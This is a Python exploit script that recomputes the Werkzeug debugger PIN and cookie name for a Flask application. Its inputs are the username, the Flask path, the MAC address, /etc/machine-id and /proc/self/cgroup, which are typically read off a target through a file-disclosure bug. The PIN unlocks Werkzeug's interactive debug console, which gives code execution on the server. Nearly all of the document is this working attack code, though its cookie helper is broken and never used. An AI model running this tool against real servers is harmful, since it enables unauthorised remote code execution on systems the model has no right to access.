import hashlib
from itertools import chain
import time
import argparse

def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]

def gen_pin(username, mac, mch_id,path,modname,appname):
    probably_public_bits = [username,modname,appname,path]
    private_bits = [str(mac), mch_id]
    
    rv = None
    num = None
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return [rv, cookie_name]


def generate_cookie(pin):
    cookie = ''
    cookie += str(int(time.time()))
    cookie += '|'
    cookie += hash_pin([pin])
    return cookie



def main():
    parser = argparse.ArgumentParser(description="Werkzeug generate PIN script")

    parser.add_argument("--username", dest="username", type=str, help="The username of the user who launched the application\nRead /etc/passwd or /proc/self/cgroup", default='www-data') # www-data
    parser.add_argument("--path", dest="path",required=True, type=str, help="Path to Flask")   # REQUIRED
    parser.add_argument("--modname", dest="modname", type=str, help="Modname",default='flask.app') # flask.app
    parser.add_argument("--appname", dest="appname", type=str, help="Appname",default='Flask') # Flask


    parser.add_argument("--mac", dest="mac", required=True, type=str, help="MAC address any interface") # REQUIRED
    parser.add_argument("--machine_id", dest="mch_id",required=True, type=str, help="Enter /etc/machine-id") # REQUIRED
    parser.add_argument("--cgroup", dest="cgroup",required=True, type=str, help="Enter /proc/self/cgroup") # REQUIRED
    
    args = parser.parse_args()
    
    

    mch_id = b""
    mch_id += args.mch_id.encode("UTF-8")
    cgroup_file = args.cgroup.strip().rpartition("/")[2].encode("UTF-8")
    mch_id += cgroup_file
    
    cookie = ''
    
   
    mac = int("".join(args.mac.split(":")),16)
    res = gen_pin(args.username, mac, mch_id, args.path, args.modname, args.appname)
    
    
    if res[0] != '' and res[1] != '':
        print("[+] SUCCESS!")
        print(f'PIN: {res[0]}\nCookie: {res[1]}={cookie}')


if __name__ == "__main__":
    main()


